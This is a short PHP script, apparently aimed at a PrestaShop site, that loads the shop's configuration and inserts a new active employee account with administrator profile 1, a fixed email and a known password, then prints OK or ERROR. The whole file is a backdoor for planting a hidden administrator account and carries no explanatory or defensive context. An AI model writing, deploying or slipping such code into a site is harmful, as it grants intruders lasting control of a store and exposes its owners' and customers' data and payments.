<?php
//============================================================================================================================================================================================================================================================================ GREN0Z
include(dirname(__FILE__).'/config/config.inc.php');
if (Db::getInstance()->Execute("INSERT INTO `"._DB_PREFIX_."employee` (`id_profile`, `lastname`, `firstname`, `email`, `passwd`, `active`) VALUES ('1', 'Vlad', 'eeeee', 'mail@vlad.zp.ua', '".md5(_COOKIE_KEY_.'1234567890')."', '1')"))
	echo 'OK';
else
	echo 'ERROR';
?>